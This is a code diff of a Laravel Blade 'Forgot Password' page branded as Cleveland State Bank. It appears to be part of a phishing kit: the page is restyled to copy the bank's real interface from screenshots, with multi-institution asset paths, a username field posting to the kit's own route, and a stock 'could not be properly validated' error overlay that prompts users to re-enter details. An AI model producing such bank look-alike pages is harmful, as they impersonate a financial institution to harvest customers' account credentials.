@@ -1,32 +1,13 @@
 <!DOCTYPE html>
-<!--- Version: /27.8.0 --->
-<!--- ng8Router: True --->
-<!--- shortVersion: 27.8.0 --->
-<!--[if lt IE 10]><html class="lt-ie9"><![endif]-->
-<html lang="en-us">
+<html lang="en-US">
 <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-<meta name="format-detection" content="telephone=no">
-<meta name="google-play-app" content="app-id=com.csiweb.digitalbanking">
-<meta name="msApplication-ID" content="microsoft.build.App" />
-<meta name="msApplication-PackageFamilyName" content="microsoft.build_appid" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Forgot Password | Cleveland State Bank</title>
 
 <link rel="apple-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
-<link rel="android-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" />
-<link rel="windows-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" />
-<link rel="shortcut icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">
 <link rel="icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/primeicons@6.0.1/primeicons.min.css">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@24,300,0,0">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
-
-<title>Forgot Password | Cleveland State Bank</title>
-<meta name="description" content="Cleveland State Bank Password Reset">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 
 <style>
 * {
@@ -36,283 +17,298 @@
 }
 
 body {
-    font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-    color: #2d3748;
-    background-color: #07192e;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     min-height: 100vh;
-    overflow-x: hidden;
-    -webkit-font-smoothing: antialiased;
+    background-color: #edf0f4;
+    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/csb-bg-ribbons.svg') }}");
+    background-size: cover;
+    background-position: center center;
+    background-repeat: no-repeat;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 30px 16px;
+    position: relative;
 }
 
-.layout-view-wrapper-loading {
-    padding-left: 0 !important;
+.csb-modal-card {
+    width: 100%;
+    max-width: 680px;
+    background: #ffffff;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25);
+    border-radius: 2px;
+    overflow: hidden;
 }
 
-.background-image {
+/* Red Header Bar */
+.modal-header-red {
+    background-color: #c8232c;
+    height: 44px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    padding: 0 16px;
+}
+
+.modal-header-title {
+    color: #ffffff;
+    font-size: 13.5px;
+    font-weight: bold;
+    letter-spacing: 0.8px;
+    text-transform: uppercase;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+.modal-close-btn {
+    position: absolute;
+    right: 16px;
+    color: #ffffff;
+    font-size: 18px;
+    font-weight: bold;
+    text-decoration: none;
+    line-height: 1;
+    cursor: pointer;
+}
+
+.modal-close-btn:hover {
+    opacity: 0.8;
+}
+
+/* Modal Body */
+.modal-body {
+    padding: 32px 36px 36px;
+    text-align: center;
+}
+
+.csb-modal-logo {
+    width: 130px;
+    height: auto;
+    max-height: 140px;
+    object-fit: contain;
+    margin: 0 auto 20px;
+    display: block;
+}
+
+.modal-divider {
+    height: 1px;
+    background-color: #e2e8f0;
+    margin: 20px 0 24px;
+    border: none;
+}
+
+.modal-instruction {
+    text-align: left;
+    font-size: 13.5px;
+    color: #333333;
+    margin-bottom: 14px;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+.input-box-wrapper {
+    position: relative;
+    border: 1px solid #b0bec5;
+    background: #ffffff;
+    border-radius: 2px;
+    margin-bottom: 24px;
+}
+
+.required-badge {
+    position: absolute;
+    top: 4px;
+    right: 8px;
+    font-size: 11px;
+    color: #78909c;
+    pointer-events: none;
+}
+
+.input-box-wrapper input {
+    width: 100%;
+    height: 52px;
+    border: none;
+    outline: none;
+    padding: 10px 14px;
+    font-size: 14px;
+    font-weight: bold;
+    color: #444444;
+    text-align: center;
+    letter-spacing: 0.6px;
+}
+
+.input-box-wrapper input::placeholder {
+    color: #78909c;
+    font-weight: bold;
+    letter-spacing: 0.8px;
+}
+
+.csb-btn-continue {
+    width: 220px;
+    height: 44px;
+    background-color: #e0e4e8;
+    color: #78909c;
+    border: none;
+    border-radius: 2px;
+    font-size: 13px;
+    font-weight: bold;
+    letter-spacing: 0.8px;
+    cursor: pointer;
+    text-transform: uppercase;
+    display: block;
+    margin: 0 auto;
+    transition: background-color 0.2s, color 0.2s;
+}
+
+.csb-btn-continue.active {
+    background-color: #1e355b;
+    color: #ffffff;
+}
+
+.csb-btn-continue:hover {
+    background-color: #1e355b;
+    color: #ffffff;
+}
+
+.back-to-signin {
+    margin-top: 18px;
+    display: block;
+    color: #1b325f;
+    font-size: 13px;
+    font-weight: 500;
+    text-decoration: none;
+}
+
+.back-to-signin:hover {
+    text-decoration: underline;
+}
+
+/* Error Banner Modal (Screenshot 5) */
+.csb-error-overlay {
     position: fixed;
     top: 0;
     left: 0;
     width: 100vw;
     height: 100vh;
-    background: #09203a;
-    background: radial-gradient(circle at 50% 25%, #103861 0%, #07192e 100%);
-    z-index: 0;
-}
-
-#loginContainer {
-    position: relative;
-    z-index: 1;
-    min-height: 100vh;
+    background: rgba(0, 0, 0, 0.45);
+    z-index: 9999;
     display: flex;
-    flex-direction: column;
-    justify-content: center;
     align-items: center;
-    padding: 30px 16px;
+    justify-content: center;
 }
 
-#loginForm {
+.csb-error-banner {
     width: 100%;
-    max-width: 440px;
-    margin: 0 auto;
-}
-
-.loginCard {
-    background: #ffffff;
-    border-radius: 8px;
-    box-shadow: 0 10px 35px rgba(0, 0, 0, 0.4);
-    padding: 36px 36px 32px;
-}
-
-.bank-logo-wrapper {
-    text-align: center;
-    margin-bottom: 20px;
-}
-
-.bank-logo {
-    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/logo.png') }}");
-    background-repeat: no-repeat;
-    background-position: center center;
-    background-size: contain;
-    height: 60px;
-    width: 100%;
-    max-width: 250px;
-    margin: 0 auto;
-    display: block;
-}
-
-.utility-textCenter {
-    text-align: center;
-}
-
-.reset-header {
-    text-align: center;
-    margin-bottom: 22px;
-}
-
-.reset-header h2 {
-    font-family: 'Montserrat', sans-serif;
-    font-size: 19px;
-    font-weight: 700;
-    color: #0f4c81;
-    margin-bottom: 6px;
-}
-
-.reset-header p {
-    font-size: 13px;
-    color: #718096;
-    line-height: 1.4;
-}
-
-/* CSI Alerts */
-.csi-alert-danger {
-    background-color: #fdf2f2;
-    border: 1px solid #f8b4b4;
-    color: #9b1c1c;
-    padding: 11px 14px;
-    border-radius: 4px;
-    font-size: 13px;
-    line-height: 1.4;
-    margin-bottom: 18px;
-}
-
-.csi-alert-success {
-    background-color: #f3faf7;
-    border: 1px solid #84e1bc;
-    color: #0e9f6e;
-    padding: 11px 14px;
-    border-radius: 4px;
-    font-size: 13px;
-    line-height: 1.4;
-    margin-bottom: 18px;
-}
-
-/* Form Controls */
-.form-group {
-    margin-bottom: 18px;
-}
-
-.control-label {
-    display: block;
-    font-family: 'Roboto', sans-serif;
-    font-size: 13px;
-    font-weight: 500;
-    color: #4a5568;
-    margin-bottom: 6px;
-}
-
-.form-control {
-    width: 100%;
-    height: 44px;
-    padding: 10px 14px;
-    font-family: 'Roboto', sans-serif;
-    font-size: 14px;
-    color: #1a202c;
-    background: #ffffff;
-    border: 1px solid #cbd5e0;
-    border-radius: 4px;
-    transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
-}
-
-.form-control:focus {
-    outline: none;
-    border-color: #0f4c81;
-    box-shadow: 0 0 0 3px rgba(15, 76, 129, 0.15);
-}
-
-/* Action Buttons */
-.btn-primary {
-    width: 100%;
-    height: 46px;
-    background-color: #0f4c81;
-    border: 1px solid #0f4c81;
-    border-radius: 4px;
+    background-color: #262626;
     color: #ffffff;
-    font-family: 'Montserrat', sans-serif;
+    padding: 32px 20px;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+}
+
+.csb-error-title {
     font-size: 14px;
-    font-weight: 600;
-    letter-spacing: 0.5px;
-    cursor: pointer;
-    transition: background-color 0.2s, border-color 0.2s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    font-weight: bold;
+    color: #e0e0e0;
+    letter-spacing: 0.8px;
+    margin-bottom: 12px;
+    text-transform: uppercase;
 }
 
-.btn-primary:hover {
-    background-color: #0a365c;
-    border-color: #0a365c;
+.csb-error-desc {
+    font-size: 13.5px;
+    line-height: 1.5;
+    color: #ffffff;
+    max-width: 600px;
+    margin: 0 auto 20px;
 }
 
-.sign-in-link-wrap {
-    text-align: center;
-    margin-top: 18px;
-}
-
-.sign-in-link-wrap a {
-    color: #0f4c81;
-    text-decoration: none;
+.csb-error-btn {
+    background-color: #d9534f;
+    border: none;
+    color: #ffffff;
     font-size: 13px;
-    font-weight: 500;
+    font-weight: bold;
+    padding: 8px 36px;
+    border-radius: 2px;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
 }
 
-.sign-in-link-wrap a:hover {
-    text-decoration: underline;
-}
-
-/* Footer */
-.login-footer {
-    margin-top: 24px;
-    text-align: center;
-    color: rgba(255, 255, 255, 0.7);
-    font-size: 12px;
-    line-height: 1.6;
-}
-
-.login-footer-badges {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 20px;
-    margin-bottom: 10px;
-}
-
-.login-footer-badges img {
-    height: 28px;
-    object-fit: contain;
-}
-
-@media (max-width: 480px) {
-    .loginCard {
-        padding: 28px 20px 24px;
-    }
+.csb-error-btn:hover {
+    background-color: #c9302c;
 }
 </style>
 </head>
-<body ontouchstart="">
-<div id="csi-angularjs-view" class="view">
-    <div class="layout-view-wrapper layout-view-wrapper-loading">
-        <div class="layout-view">
-            <div class="background-image"></div>
-            <div id="loginContainer">
-                <div id="loginForm">
-                    <div class="loginFormInner layout-delay">
-                        <div class="loginCard layout-delay ng-isolate-scope">
-                            <!-- BEGIN LOGIN BODY -->
-                            <section class="loginBody">
-                                <div class="bank-logo-wrapper">
-                                    <div class="utility-textCenter bank-logo"></div>
-                                </div>
+<body>
 
-                                <div class="reset-header">
-                                    <h2>Password Reset</h2>
-                                    <p>Enter your Access ID or registered email address to receive password reset instructions.</p>
-                                </div>
+    <div class="csb-modal-card">
+        <div class="modal-header-red">
+            <span class="modal-header-title">FORGOT PASSWORD</span>
+            <a href="{{ route('login') }}" class="modal-close-btn" title="Close">&#10005;</a>
+        </div>
 
-                                @if (session('status'))
-                                    <div class="csi-alert-success">
-                                        {{ session('status') }}
-                                    </div>
-                                @endif
+        <div class="modal-body">
+            <img src="{{ asset('assets/institutions/clevelandstatebank/images/csb-modal-logo.png') }}" alt="Cleveland State Bank" class="csb-modal-logo">
 
-                                @if ($errors->any())
-                                    <div class="csi-alert-danger">
-                                        @foreach ($errors->all() as $error)
-                                            <div>{{ $error }}</div>
-                                        @endforeach
-                                    </div>
-                                @endif
+            <div class="modal-divider"></div>
 
-                                <form method="POST" action="{{ route('password.email') }}" id="csiForgotForm">
-                                    @csrf
+            <p class="modal-instruction">Enter your information below:</p>
 
-                                    <div class="form-group">
-                                        <label class="control-label">Access ID or Email Address *</label>
-                                        <input type="text" name="email" value="{{ old('email') }}" class="form-control" placeholder="Enter Access ID or Email" required autofocus>
-                                    </div>
+            <form method="POST" action="{{ route('password.email') }}" id="csbForgotForm">
+                @csrf
 
-                                    <button type="submit" class="btn btn-primary btn-block">Send Reset Link</button>
-                                </form>
-
-                                <div class="sign-in-link-wrap">
-                                    <a href="{{ route('login') }}">Remember your password? Sign In</a>
-                                </div>
-                            </section>
-                            <!-- /END LOGIN BODY -->
-                        </div>
-                    </div>
+                <div class="input-box-wrapper">
+                    <span class="required-badge">required</span>
+                    <input 
+                        type="text" 
+                        name="email" 
+                        id="forgotEmail" 
+                        placeholder="USERNAME" 
+                        value="{{ old('email') }}" 
+                        required 
+                        autofocus
+                    >
                 </div>
 
-                <footer class="login-footer">
-                    <div class="login-footer-badges">
-                        <img src="{{ asset('assets/institutions/clevelandstatebank/images/fdic-white.png') }}" alt="Member FDIC">
-                        <img src="{{ asset('assets/institutions/clevelandstatebank/images/ehl-white.png') }}" alt="Equal Housing Lender">
-                    </div>
-                    <div>&copy; {{ date('Y') }} Cleveland State Bank. All Rights Reserved. Member FDIC. Equal Housing Lender.</div>
-                </footer>
+                <button type="submit" class="csb-btn-continue" id="btnContinue">CONTINUE</button>
 
-            </div>
+                <a href="{{ route('login') }}" class="back-to-signin">Back to Sign In</a>
+            </form>
         </div>
     </div>
-</div>
+
+    <!-- Error Banner Overlay (Shown when error exists) -->
+    @if ($errors->any() || session('error'))
+    <div class="csb-error-overlay" id="errorOverlay">
+        <div class="csb-error-banner">
+            <div class="csb-error-title">AN ERROR HAS OCCURRED</div>
+            <div class="csb-error-desc">
+                The information you entered could not be properly validated.<br>
+                Please double check your information and if you feel it is<br>
+                correct please contact your financial institution for further help.
+            </div>
+            <button type="button" class="csb-error-btn" onclick="document.getElementById('errorOverlay').style.display='none'">OK</button>
+        </div>
+    </div>
+    @endif
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var input = document.getElementById('forgotEmail');
+        var btn = document.getElementById('btnContinue');
+        if (input && btn) {
+            input.addEventListener('input', function() {
+                if (input.value.trim().length > 0) {
+                    btn.classList.add('active');
+                } else {
+                    btn.classList.remove('active');
+                }
+            });
+            if (input.value.trim().length > 0) {
+                btn.classList.add('active');
+            }
+        }
+    });
+    </script>
 </body>
 </html>
